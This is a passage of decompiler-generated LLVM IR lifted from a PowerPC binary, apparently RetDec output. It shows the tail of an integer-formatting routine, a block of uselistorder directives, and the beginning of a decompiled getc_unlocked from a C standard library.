dec_label_pc_1000ece4:                            ; preds = %dec_label_pc_1000ecdc
  %v0_1000ece4 = load i32, i32* @r7, align 4
  %v1_1000ece4 = icmp slt i32 %v0_1000ece4, 0
  %v3_1000ece4 = icmp eq i32 %v0_1000ece4, 0
  store i1 %v1_1000ece4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ece4, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_1000ece4, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_1000ece4, -1
  br i1 %tmp80, label %dec_label_pc_1000ed00, label %dec_label_pc_1000ecf8

dec_label_pc_1000ecf8:                            ; preds = %dec_label_pc_1000ece4
  %v1_1000ecf8 = sub i32 0, %v0_1000ece4
  store i32 %v1_1000ecf8, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000ed00

dec_label_pc_1000ed00:                            ; preds = %dec_label_pc_1000ece4, %dec_label_pc_1000ecf8
  %v0_1000ed1431 = phi i32 [ %v0_1000ece4, %dec_label_pc_1000ece4 ], [ %v1_1000ecf8, %dec_label_pc_1000ecf8 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000ed04 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_1000ed04, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000ed14

dec_label_pc_1000ed14:                            ; preds = %dec_label_pc_1000ed14.backedge, %dec_label_pc_1000ed00
  %v2_1000ed34 = phi i32 [ %v3_1000ed34, %dec_label_pc_1000ed14.backedge ], [ %v2_1000ed04, %dec_label_pc_1000ed00 ]
  %v0_1000ed18 = phi i32 [ %v0_1000ed18.pre, %dec_label_pc_1000ed14.backedge ], [ 2, %dec_label_pc_1000ed00 ]
  %v1_1000ed14 = phi i32 [ %v1_1000ed14.pre, %dec_label_pc_1000ed14.backedge ], [ 10, %dec_label_pc_1000ed00 ]
  %v1_1000ed28 = phi i32 [ %v0_1000ed14.pre, %dec_label_pc_1000ed14.backedge ], [ %v0_1000ed1431, %dec_label_pc_1000ed00 ]
  %v2_1000ed14 = sdiv i32 %v1_1000ed28, %v1_1000ed14
  store i32 %v2_1000ed14, i32* %r0.global-to-local, align 4
  %v1_1000ed18 = add i32 %v0_1000ed18, 1
  store i32 %v1_1000ed18, i32* @r7, align 4
  %v1_1000ed1c = icmp slt i32 %v1_1000ed18, 3
  %v3_1000ed1c = icmp eq i32 %v1_1000ed18, 3
  store i1 %v1_1000ed1c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ed1c, i1* %cr7_eq.global-to-local, align 1
  %v1_1000ed24 = icmp slt i32 %v2_1000ed14, 0
  %v2_1000ed24 = icmp sgt i32 %v2_1000ed14, 0
  %v3_1000ed24 = icmp eq i32 %v2_1000ed14, 0
  store i1 %v1_1000ed24, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000ed24, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000ed24, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_1000ed14, -10
  store i32 %v2_1000ed14, i32* %r11.global-to-local, align 4
  %v2_1000ed28 = add i32 %v1_1000ed28, 48
  %v1_1000ed30 = add i32 %v2_1000ed28, %tmp81
  store i32 %v1_1000ed30, i32* %r9.global-to-local, align 4
  %v1_1000ed34 = trunc i32 %v1_1000ed30 to i8
  %v3_1000ed34 = add i32 %v2_1000ed34, -1
  %v4_1000ed34 = inttoptr i32 %v3_1000ed34 to i8*
  store i8 %v1_1000ed34, i8* %v4_1000ed34, align 1
  store i32 %v3_1000ed34, i32* %r10.global-to-local, align 4
  %v0_1000ed38 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000ed38 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000ed38 = or i1 %v0_1000ed38, %v1_1000ed38
  br i1 %v2_1000ed38, label %dec_label_pc_1000ed14.backedge, label %dec_label_pc_1000ed3c

dec_label_pc_1000ed14.backedge:                   ; preds = %dec_label_pc_1000ed14, %dec_label_pc_1000ed3c
  %v0_1000ed14.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ed14.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1000ed18.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1000ed14

dec_label_pc_1000ed3c:                            ; preds = %dec_label_pc_1000ed14
  %v0_1000ed3c = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000ed3c, label %dec_label_pc_1000ed40, label %dec_label_pc_1000ed14.backedge

dec_label_pc_1000ed40:                            ; preds = %dec_label_pc_1000ed3c
  %v1_1000ed40 = add i32 %v2_1000ed34, -2
  store i32 %v1_1000ed40, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_1000ed48 = add i32 %v2_1000ed34, -3
  store i32 %v1_1000ed48, i32* %r11.global-to-local, align 4
  %v0_1000ed4c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000ed4c = trunc i32 %v0_1000ed4c to i8
  %v4_1000ed4c = inttoptr i32 %v1_1000ed40 to i8*
  store i8 %v1_1000ed4c, i8* %v4_1000ed4c, align 1
  %v0_1000ed50 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000ed50 = trunc i32 %v0_1000ed50 to i8
  %v2_1000ed50 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000ed50 = add i32 %v2_1000ed50, -1
  %v4_1000ed50 = inttoptr i32 %v3_1000ed50 to i8*
  store i8 %v1_1000ed50, i8* %v4_1000ed50, align 1
  %v0_1000ed54 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ed54 = load i32, i32* @r8, align 4
  %v2_1000ed54 = inttoptr i32 %v1_1000ed54 to i32*
  store i32 %v0_1000ed54, i32* %v2_1000ed54, align 4
  %v0_1000ed58 = load i32, i32* @r7, align 4
  %v1_1000ed58 = load i32, i32* @r8, align 4
  %v2_1000ed58 = add i32 %v1_1000ed58, 4
  %v3_1000ed58 = inttoptr i32 %v2_1000ed58 to i32*
  store i32 %v0_1000ed58, i32* %v3_1000ed58, align 4
  %v0_1000ed5c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ed5c = load i32, i32* @r8, align 4
  %v2_1000ed5c = add i32 %v1_1000ed5c, 8
  %v3_1000ed5c = inttoptr i32 %v2_1000ed5c to i32*
  store i32 %v0_1000ed5c, i32* %v3_1000ed5c, align 4
  %v0_1000ed60 = load i32, i32* @r8, align 4
  %v1_1000ed60 = add i32 %v0_1000ed60, 12
  store i32 %v1_1000ed60, i32* @r8, align 4
  br label %dec_label_pc_1000ed64

dec_label_pc_1000ed64:                            ; preds = %dec_label_pc_1000ecdc, %dec_label_pc_1000e8b8, %dec_label_pc_1000ed40
  %v0_1000ede0 = phi i32 [ %v1_1000ed7037, %dec_label_pc_1000ecdc ], [ %v2_1000e8c4, %dec_label_pc_1000e8b8 ], [ %v1_1000ed60, %dec_label_pc_1000ed40 ]
  %v2_1000ed64 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_1000ed64, i32* %r9.global-to-local, align 4
  %v1_1000ed74.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000ed68

dec_label_pc_1000ed68:                            ; preds = %dec_label_pc_1000ed68, %dec_label_pc_1000ed64
  %v1_1000ed74 = phi i32 [ %v2_1000ed74, %dec_label_pc_1000ed68 ], [ %v1_1000ed74.pre, %dec_label_pc_1000ed64 ]
  %v0_1000ed68 = phi i32 [ %v1_1000ed6c, %dec_label_pc_1000ed68 ], [ %v2_1000ed64, %dec_label_pc_1000ed64 ]
  %v1_1000ed68 = inttoptr i32 %v0_1000ed68 to i32*
  %v2_1000ed68 = load i32, i32* %v1_1000ed68, align 4
  store i32 %v2_1000ed68, i32* %r0.global-to-local, align 4
  %v1_1000ed6c = add i32 %v0_1000ed68, 12
  store i32 %v1_1000ed6c, i32* %r9.global-to-local, align 4
  %v2_1000ed70 = icmp ult i32 %v1_1000ed6c, %v0_1000ede0
  %v2_1000ed74 = sub i32 %v1_1000ed74, %v2_1000ed68
  store i32 %v2_1000ed74, i32* @r28, align 4
  br i1 %v2_1000ed70, label %dec_label_pc_1000ed68, label %dec_label_pc_1000ed7c

dec_label_pc_1000ed7c:                            ; preds = %dec_label_pc_1000ed68
  %v4_1000ed70 = icmp eq i32 %v1_1000ed6c, %v0_1000ede0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000ed70, i1* %cr7_eq.global-to-local, align 1
  %v3_1000ed7c = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* @r10, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_1000ede0, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_1000ed7c, 0
  %v1_1000ed90 = zext i1 %tmp85 to i32
  store i32 %v1_1000ed90, i32* %r9.global-to-local, align 4
  %v2_1000ed94 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_1000ed94, i32* %r0.global-to-local, align 4
  %v2_1000ed98 = sub i32 %v2_1000ed74, %v1_1000ed90
  store i32 %v2_1000ed98, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_1000ed98, 1
  br i1 %tmp82, label %dec_label_pc_1000ee04, label %dec_label_pc_1000eda8

dec_label_pc_1000eda8:                            ; preds = %dec_label_pc_1000ed7c
  %v3_1000eda8 = load i32, i32* %v2_1000e7e4, align 4
  store i32 %v3_1000eda8, i32* %r0.global-to-local, align 4
  %v1_1000edac = and i32 %v3_1000eda8, 8
  store i32 %v1_1000edac, i32* @r7, align 4
  %v3_1000edac = icmp eq i32 %v1_1000edac, 0
  br i1 %v3_1000edac, label %dec_label_pc_1000edd0, label %dec_label_pc_1000edb4

dec_label_pc_1000edb4:                            ; preds = %dec_label_pc_1000eda8
  %v1_1000edb8 = add i32 %v0_1000ede0, 12
  store i32 %v1_1000edb8, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10017283.382 to i32), i32* %r9.global-to-local, align 4
  %v2_1000edc0 = inttoptr i32 %v0_1000ede0 to i32*
  store i32 160, i32* %v2_1000edc0, align 4
  %v0_1000edc4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000edc4 = load i32, i32* @r8, align 4
  %v2_1000edc4 = add i32 %v1_1000edc4, 4
  %v3_1000edc4 = inttoptr i32 %v2_1000edc4 to i32*
  store i32 %v0_1000edc4, i32* %v3_1000edc4, align 4
  %v0_1000edc8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000edc8 = load i32, i32* @r8, align 4
  %v2_1000edc8 = add i32 %v1_1000edc8, 8
  %v3_1000edc8 = inttoptr i32 %v2_1000edc8 to i32*
  store i32 %v0_1000edc8, i32* %v3_1000edc8, align 4
  br label %dec_label_pc_1000ee04

dec_label_pc_1000edd0:                            ; preds = %dec_label_pc_1000eda8
  %v1_1000edd0 = add i32 %tmp, 16
  %v2_1000edd0 = inttoptr i32 %v1_1000edd0 to i32*
  %v3_1000edd0 = load i32, i32* %v2_1000edd0, align 4
  store i32 %v3_1000edd0, i32* %r0.global-to-local, align 4
  %v1_1000edd4 = icmp slt i32 %v3_1000edd0, 48
  %v3_1000edd4 = icmp eq i32 %v3_1000edd0, 48
  store i1 %v1_1000edd4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000edd4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000edd4, label %dec_label_pc_1000eddc, label %dec_label_pc_1000edf8

dec_label_pc_1000eddc:                            ; preds = %dec_label_pc_1000edd0
  %v3_1000eddc = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_1000ede0, i32* @r30, align 4
  %v2_1000ede4 = add i32 %v3_1000eddc, %v2_1000ed98
  store i32 %v2_1000ede4, i32* %r0.global-to-local, align 4
  store i32 %v2_1000ede4, i32* %stack_var_-140, align 4
  br label %dec_label_pc_1000ee04

dec_label_pc_1000edf0:                            ; preds = %dec_label_pc_1000ee0c
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_1000ee40

dec_label_pc_1000edf8:                            ; preds = %dec_label_pc_1000edd0
  store i32 %v2_1000ed74, i32* %r0.global-to-local, align 4
  store i32 %v0_1000ede0, i32* @r30, align 4
  br label %dec_label_pc_1000ee04

dec_label_pc_1000ee04:                            ; preds = %dec_label_pc_1000ed7c, %dec_label_pc_1000eddc, %dec_label_pc_1000edb4, %dec_label_pc_1000edf8
  store i32 0, i32* @r29, align 4
  %v2_1000ee08 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_1000ee08, i32* @r31, align 4
  br label %dec_label_pc_1000ee0c

dec_label_pc_1000ee0c:                            ; preds = %dec_label_pc_1000ee3c, %dec_label_pc_1000ee04
  %v0_1000ee1c = phi i32 [ %v1_1000ee28, %dec_label_pc_1000ee3c ], [ %v2_1000ee08, %dec_label_pc_1000ee04 ]
  %v1_1000ee0c = inttoptr i32 %v0_1000ee1c to i32*
  %v2_1000ee0c = load i32, i32* %v1_1000ee0c, align 4
  store i32 %v2_1000ee0c, i32* %r4.global-to-local, align 4
  %v0_1000ee10 = load i32, i32* @r27, align 4
  store i32 %v0_1000ee10, i32* %r3.global-to-local, align 4
  %v1_1000ee14 = add i32 %v0_1000ee1c, 4
  %v2_1000ee14 = inttoptr i32 %v1_1000ee14 to i32*
  %v3_1000ee14 = load i32, i32* %v2_1000ee14, align 4
  store i32 %v3_1000ee14, i32* %r5.global-to-local, align 4
  %v0_1000ee18 = load i32, i32* @r26, align 4
  store i32 %v0_1000ee18, i32* %ctr.global-to-local, align 4
  %v1_1000ee1c = add i32 %v0_1000ee1c, 8
  %v2_1000ee1c = inttoptr i32 %v1_1000ee1c to i32*
  %v3_1000ee1c = load i32, i32* %v2_1000ee1c, align 4
  store i32 %v3_1000ee1c, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_1000ee18)
  %v0_1000ee24 = load i32, i32* @r31, align 4
  %v1_1000ee24 = add i32 %v0_1000ee24, 4
  %v2_1000ee24 = inttoptr i32 %v1_1000ee24 to i32*
  %v3_1000ee24 = load i32, i32* %v2_1000ee24, align 4
  store i32 %v3_1000ee24, i32* %r0.global-to-local, align 4
  %v1_1000ee28 = add i32 %v0_1000ee24, 12
  store i32 %v1_1000ee28, i32* @r31, align 4
  %v0_1000ee2c = load i32, i32* @r29, align 4
  %v1_1000ee2c = load i32, i32* %r3.global-to-local, align 4
  %v2_1000ee2c = add i32 %v1_1000ee2c, %v0_1000ee2c
  store i32 %v2_1000ee2c, i32* @r29, align 4
  %v2_1000ee30 = icmp slt i32 %v1_1000ee2c, %v3_1000ee24
  %v4_1000ee30 = icmp eq i32 %v1_1000ee2c, %v3_1000ee24
  store i1 %v2_1000ee30, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000ee30, i1* %cr7_eq.global-to-local, align 1
  %v1_1000ee34 = load i32, i32* @r30, align 4
  %v2_1000ee34 = icmp ult i32 %v1_1000ee28, %v1_1000ee34
  %v3_1000ee34 = icmp ugt i32 %v1_1000ee28, %v1_1000ee34
  %v4_1000ee34 = icmp eq i32 %v1_1000ee28, %v1_1000ee34
  store i1 %v2_1000ee34, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_1000ee34, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_1000ee34, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_1000ee30, label %dec_label_pc_1000ee3c, label %dec_label_pc_1000edf0

dec_label_pc_1000ee3c:                            ; preds = %dec_label_pc_1000ee0c
  br i1 %v2_1000ee34, label %dec_label_pc_1000ee0c, label %dec_label_pc_1000ee40

dec_label_pc_1000ee40:                            ; preds = %dec_label_pc_1000ee3c, %dec_label_pc_1000edf0
  %v0_1000ee44 = phi i32 [ -1, %dec_label_pc_1000edf0 ], [ %v2_1000ee2c, %dec_label_pc_1000ee3c ]
  store i32 %v0_1000e794, i32* %r0.global-to-local, align 4
  store i32 %v0_1000ee44, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ee44

; uselistorder directives
  uselistorder i32 %v0_1000ee44, { 1, 0 }
  uselistorder i32 %v1_1000ee2c, { 2, 1, 0 }
  uselistorder i32 %v1_1000ee28, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v3_1000ee24, { 1, 0, 2 }
  uselistorder i32 %v0_1000ee1c, { 0, 2, 1 }
  uselistorder i32 %v3_1000edd0, { 1, 0, 2 }
  uselistorder i32 %v1_1000ed90, { 1, 0 }
  uselistorder i32 %v2_1000ed74, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000ed6c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000ed68, { 1, 0 }
  uselistorder i32 %v0_1000ede0, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_1000ed34, { 1, 2, 0 }
  uselistorder i32 %v1_1000ed18, { 1, 0, 2 }
  uselistorder i32 %v2_1000ed14, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_1000ece4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_1000ecb4, { 2, 0, 1 }
  uselistorder i32 %v2_1000ecb0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000ec20, { 1, 0 }
  uselistorder i32 %v2_1000eb84, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1000eb58, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_1000eb20, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1000eb18, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_1000eae4, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_1000ead4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_1000eac8, { 1, 0, 2 }
  uselistorder i32 %v1_1000eaac, { 0, 3, 2, 1 }
  uselistorder i32 %v2_1000ea64, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_1000ea54, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000ea38, { 1, 0 }
  uselistorder i32 %v1_1000ea14, { 1, 0 }
  uselistorder i32 %v2_1000e9f4, { 1, 0, 2 }
  uselistorder i32 %v0_1000e99c, { 1, 0 }
  uselistorder i32 %v1_1000e800, { 1, 0 }
  uselistorder i32 %v0_1000e88c, { 2, 1, 0 }
  uselistorder i32 %v1_1000e7d4, { 1, 0 }
  uselistorder i32 %v1_1000e7b4, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 4, 1, 2, 3, 0, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 3, 4, 1, 6, 5, 7, 8, 9, 10 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 11, 9, 10, 12, 13, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 4, 5, 0, 6, 1, 7, 3, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 17, 15, 18, 16, 19, 20, 21, 22 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 9, 7, 10, 13, 11, 12, 14, 15, 16, 18, 17 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41 }
  uselistorder i1* %cr7_lt.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_eq.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 45, { 2, 0, 1, 3 }
  uselistorder i32 112, { 2, 3, 0, 1, 4 }
  uselistorder i32 176, { 1, 2, 0, 3, 4 }
  uselistorder i8 48, { 0, 1, 2, 3, 5, 4 }
  uselistorder %1 (i32, i32, i32)* @__asm_cror, { 1, 0 }
  uselistorder i32 -2147483648, { 12, 0, 1, 15, 14, 2, 4, 3, 16, 6, 5, 17, 8, 7, 18, 9, 19, 13, 10, 11 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_10017280.380 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0 }
  uselistorder label %dec_label_pc_1000ee04, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000ed64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ed14.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed00, { 1, 0 }
  uselistorder label %dec_label_pc_1000ecdc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ecb0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec9c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec80, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ec38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ec14, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000ebf8, { 1, 0 }
  uselistorder label %dec_label_pc_1000eb68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000eb04, { 1, 0 }
  uselistorder label %dec_label_pc_1000eac4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000ea88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ea5c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000ea3c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e9c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e8b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e810, { 1, 0 }
  uselistorder label %dec_label_pc_1000e7e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e7d8, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_1000ee58 = load i32, i32* @lr, align 4
  store i32 %v0_1000ee58, i32* %r0.global-to-local, align 4
  %v0_1000ee60 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000ee6c = add i32 %tmp, 16
  %v3_1000ee6c = inttoptr i32 %v2_1000ee6c to i32*
  %v4_1000ee6c = load i32, i32* %v3_1000ee6c, align 4
  store i32 %v4_1000ee6c, i32* %r9.global-to-local, align 4
  %v2_1000ee70 = add i32 %tmp, 24
  %v3_1000ee70 = inttoptr i32 %v2_1000ee70 to i32*
  %v4_1000ee70 = load i32, i32* %v3_1000ee70, align 4
  store i32 %v4_1000ee70, i32* %r0.global-to-local, align 4
  %v2_1000ee74 = icmp ult i32 %v4_1000ee6c, %v4_1000ee70
  br i1 %v2_1000ee74, label %dec_label_pc_1000eedc, label %dec_label_pc_1000ee7c

dec_label_pc_1000ee7c:                            ; preds = %entry
  %v3_1000ee7c = load i16, i16* %arg1, align 2
  %v4_1000ee7c = zext i16 %v3_1000ee7c to i32
  %v1_1000ee80 = and i32 %v4_1000ee7c, 131
  store i32 %v1_1000ee80, i32* %r0.global-to-local, align 4
  %v2_1000ee84 = icmp ugt i32 %v1_1000ee80, 128
  br i1 %v2_1000ee84, label %dec_label_pc_1000ee9c, label %dec_label_pc_1000ee8c

dec_label_pc_1000ee8c:                            ; preds = %dec_label_pc_1000ee7c
  store i32 268496532, i32* @lr, align 4
  %v3_1000ee90 = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v4_1000ee6c)
  store i32 %v3_1000ee90, i32* %r3.global-to-local, align 4
  %v3_1000ee94 = icmp eq i32 %v3_1000ee90, 0
  br i1 %v3_1000ee94, label %dec_label_pc_1000ee8c.dec_label_pc_1000ee9c_crit_edge, label %dec_label_pc_1000ef78

dec_label_pc_1000ee8c.dec_label_pc_1000ee9c_crit_edge: ; preds = %dec_label_pc_1000ee8c
  %v0_1000ee9c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ee9c

dec_label_pc_1000ee9c:                            ; preds = %dec_label_pc_1000ee8c.dec_label_pc_1000ee9c_crit_edge, %dec_label_pc_1000ee7c
  %v2_1000eefc = phi i32 [ %v0_1000ee9c.pre, %dec_label_pc_1000ee8c.dec_label_pc_1000ee9c_crit_edge ], [ %tmp, %dec_label_pc_1000ee7c ]
  %v1_1000ee9c = inttoptr i32 %v2_1000eefc to i16*
  %v2_1000ee9c = load i16, i16* %v1_1000ee9c, align 2
  %v3_1000ee9c = zext i16 %v2_1000ee9c to i32
  %v1_1000eea0 = and i32 %v3_1000ee9c, 2
  store i32 %v1_1000eea0, i32* %r0.global-to-local, align 4
  %v3_1000eea0 = icmp eq i32 %v1_1000eea0, 0
  br i1 %v3_1000eea0, label %dec_label_pc_1000eecc, label %dec_label_pc_1000eea8

dec_label_pc_1000eea8:                            ; preds = %dec_label_pc_1000ee9c
  %v1_1000eea8 = call i32 @__asm_rlwinm(i32 %v3_1000ee9c, i32 2, i32 29, i32 29)
  %v1_1000eeac = load i32, i32* @r31, align 4
  %v2_1000eeac = add i32 %v1_1000eeac, %v1_1000eea8
  store i32 %v2_1000eeac, i32* %r9.global-to-local, align 4
  %v1_1000eeb0 = add i32 %v2_1000eeac, 39
  %v2_1000eeb0 = inttoptr i32 %v1_1000eeb0 to i8*
  %v3_1000eeb0 = load i8, i8* %v2_1000eeb0, align 1
  %v4_1000eeb0 = zext i8 %v3_1000eeb0 to i32
  store i32 %v4_1000eeb0, i32* %r0.global-to-local, align 4
  %v1_1000eeb4 = add nsw i32 %v3_1000ee9c, -1
  store i32 %v1_1000eeb4, i32* %r9.global-to-local, align 4
  %v1_1000eeb8 = trunc i32 %v1_1000eeb4 to i16
  %v3_1000eeb8 = inttoptr i32 %v1_1000eeac to i16*
  store i16 %v1_1000eeb8, i16* %v3_1000eeb8, align 2
  %v0_1000eebc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000eebc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000eec4 = load i32, i32* @r31, align 4
  %v2_1000eec4 = add i32 %v1_1000eec4, 40
  %v3_1000eec4 = inttoptr i32 %v2_1000eec4 to i32*
  store i32 0, i32* %v3_1000eec4, align 4
  br label %dec_label_pc_1000ef7c

dec_label_pc_1000eecc:                            ; preds = %dec_label_pc_1000ee9c
  %v1_1000eecc = add i32 %v2_1000eefc, 16
  %v2_1000eecc = inttoptr i32 %v1_1000eecc to i32*
  %v3_1000eecc = load i32, i32* %v2_1000eecc, align 4
  store i32 %v3_1000eecc, i32* %r9.global-to-local, align 4
  %v1_1000eed0 = add i32 %v2_1000eefc, 20
  %v2_1000eed0 = inttoptr i32 %v1_1000eed0 to i32*
  %v3_1000eed0 = load i32, i32* %v2_1000eed0, align 4
  store i32 %v3_1000eed0, i32* %r0.global-to-local, align 4
  %v4_1000eed4 = icmp eq i32 %v3_1000eed0, %v3_1000eecc
  br i1 %v4_1000eed4, label %dec_label_pc_1000eee8, label %dec_label_pc_1000eedc

dec_label_pc_1000eedc:                            ; preds = %dec_label_pc_1000eecc, %entry
  %v1_1000ef507 = phi i32 [ %v2_1000eefc, %dec_label_pc_1000eecc ], [ %tmp, %entry ]
  %v0_1000eedc = phi i32 [ %v3_1000eecc, %dec_label_pc_1000eecc ], [ %v4_1000ee6c, %entry ]
  %v1_1000eedc = inttoptr i32 %v0_1000eedc to i8*
  %v2_1000eedc = load i8, i8* %v1_1000eedc, align 1
  %v3_1000eedc = zext i8 %v2_1000eedc to i32
  store i32 %v3_1000eedc, i32* %r3.global-to-local, align 4
  %v1_1000eee0 = add i32 %v0_1000eedc, 1
  store i32 %v1_1000eee0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000ef50

dec_label_pc_1000eee8:                            ; preds = %dec_label_pc_1000eecc
  %v1_1000eee8 = add i32 %v2_1000eefc, 4
  %v2_1000eee8 = inttoptr i32 %v1_1000eee8 to i32*
  %v3_1000eee8 = load i32, i32* %v2_1000eee8, align 4
  store i32 %v3_1000eee8, i32* %r0.global-to-local, align 4
